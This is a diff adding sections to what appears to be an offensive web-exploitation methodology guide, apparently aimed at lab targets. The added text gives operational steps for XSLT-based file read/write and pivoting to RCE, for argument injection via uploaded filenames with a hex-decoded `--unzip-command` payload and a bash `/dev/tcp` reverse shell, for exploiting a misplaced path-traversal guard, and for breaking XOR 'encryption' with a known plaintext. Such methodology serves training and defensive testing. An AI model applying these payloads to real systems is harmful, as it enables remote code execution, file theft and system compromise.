@@ -109,6 +109,31 @@ Two structural limits worth recognising rather than retrying:
   the usual "read the process environment for deployment secrets" move is simply
   unavailable through this class of primitive.
 
+**User-supplied XSLT / XML transform** — any "convert/prettify/render XML"
+feature that accepts a stylesheet is handing you a Turing-complete language with
+file I/O. Fingerprint the engine first: `system-property('xsl:vendor')` (libxslt
+= Python lxml; Xalan/Saxon = Java, which additionally exposes Java extension
+functions → direct RCE). For libxslt, the app frequently locks the *XML* parser
+against XXE (`resolve_entities=False, no_network=True, load_dtd=False`) yet builds
+the *stylesheet* with a default parser and no `XSLTAccessControl`, leaving the
+transform's own I/O open:
+```xml
+<xsl:value-of select="document('file:///etc/fonts/fonts.conf')/fontconfig/dir[1]"/>  <!-- READ (XML only) -->
+<exsl:document href="file:///path/evil" method="text">...</exsl:document>            <!-- WRITE (any type) -->
+```
+Map the surface with three probes: read a known XML file (text files throw
+"Cannot resolve URI" — libxslt has no `unparsed-text`, so `document()` reads XML
+only), `document('http://you/')` for SSRF (a miss is usually the target's egress
+filter, not lxml), and an `exsl:document` write read back with `document()`.
+**Write is the strong primitive** — no type restriction. Two traps that read as
+"blocked": `exsl:document` will not create parent directories (missing dir →
+silent transform abort), and it mangles newlines under `method="text"`, so write
+any payload script as a single line of `;`-separated statements. Pivot write→RCE
+by dropping a file into any interpreter directory something else executes (a cron
+over a web-writable `scripts/`, a `.pth` in a writable venv, an overwritten app
+module under mod_wsgi reload); exfil results base64-wrapped inside an XML file and
+pull them back through the same `document()` reader when egress is filtered.
+
 **File upload** — check what the filter actually validates: extension, MIME,
 magic bytes. Bypasses: `.phtml`, `.php5`, `.phar`, double extension,
 `.htaccess` upload, null byte on old stacks, valid image header + PHP tail.
@@ -132,6 +157,22 @@ files). This is a full source-disclosure primitive — use it exactly like the
 first. With mod_php present, `.htaccess` `php_value auto_prepend_file` /
 `AddHandler ... .php` on your upload is direct RCE instead. (Also note
 CVE-2025-66200, a `mod_userdir`+`suexec` bypass via FileInfo, ≤ 2.4.65.)
+
+**Argument injection when the app shells out over user filenames (`zip <out>
+*`, `tar`, `chown`, `convert`).** Any feature that archives/processes "your
+files" by globbing a directory you can upload into is an argument-injection sink:
+a filename that begins with `-` is parsed as an *option*, not a file. Confirm by
+uploading a file named `-h`/`--help` and watching the tool print usage into the
+response. Then weaponise per tool — for `zip 3.0`, upload three files: `-T`,
+`--unzip-command=<cmd>` (a.k.a. `-TT`), and one real file; `<cmd>` runs (as the
+web user) to "test" the archive and its stdout is reflected. Filename limits are
+routine to dodge: a multipart `filename=` **truncates at `;`**, and `/` is
+disallowed — build `/` at runtime (`$(pwd|head -c1)`) or hex-decode the whole
+command on the box (`--unzip-command=echo <hex>|xxd -r -p|sh #`, the `#` eats the
+archive path the tool appends). The sink is often `/bin/sh` (dash), so a bash
+`>&` reverse shell fails — pipe a hex-decoded `bash -i >& /dev/tcp/…` into `bash`,
+or just drop a webshell into a web-served dir and drive it. Class discovered on a
+packet-capture app's "download all as zip".
 
 **SQL injection** — test `'`, `"`, `\`, then order-by/union. Once confirmed, go
 straight to `sqlmap` for extraction rather than hand-rolling:
@@ -392,6 +433,32 @@ Framework note: a Rails `_*_session` cookie that decrypts (with a leaked
 plain `auth_token` cookie bound to client IP (`<db-auth_token>&M&<ip>`), replayable
 straight from the DB you just read. It authenticates GETs, but Rails CSRF still
 blocks POST/DELETE without a full session.
+
+**A canonicalisation check wired to the wrong operation is no guard.** Code like
+`if (path.normalize(p) == p) { … }` reads as a traversal guard, but check *which*
+operation it gates. A `..` path makes the equality **false**, so if the dangerous
+read/write sits **outside** that `if` (or in its `else`), the check only ever
+protected the safe branch. Seen in a Node file store: `normalize==` gated a
+*remote* fetch while the local `readFile(base+name)` ran unconditionally → full
+arbitrary read via `/file/..%2f..%2f…` (URL-encoded slashes smuggle a traversal
+through a single-segment `:param`). The fix — and what to confirm is present — is
+comparing a *resolved* path (`fs.realpath`) against an allow-listed prefix
+**before any fs call**, not the raw string against its own normalisation.
+
+## "Encrypted" storage that is really XOR
+
+When an app claims to encrypt stored files, compare lengths first:
+**|ciphertext| == |plaintext| means a stream/XOR cipher, not a block cipher** (no
+padding, no IV expansion). Upload a known plaintext, fetch the raw stored blob
+(often reachable via a `static`/`public` mount the app forgot maps to the upload
+dir), and XOR the two — the result *is* the keystream. If it repeats with period
+N, the key is those N bytes and you can decrypt every stored file. Better: if a
+read endpoint decrypts on the way out, it will happily XOR-*decode* any file a
+traversal feeds it, so you recover **plaintext source** by XORing the response
+back with the recovered key (the download link often hands you clean base64 of
+the decoded bytes). Static repeating-key XOR sold as "military grade" is a
+recurring lab joke; treat any equal-length "ciphertext" as a one-known-plaintext
+break.
 
 ## Services that execute attacker-supplied browser code
 
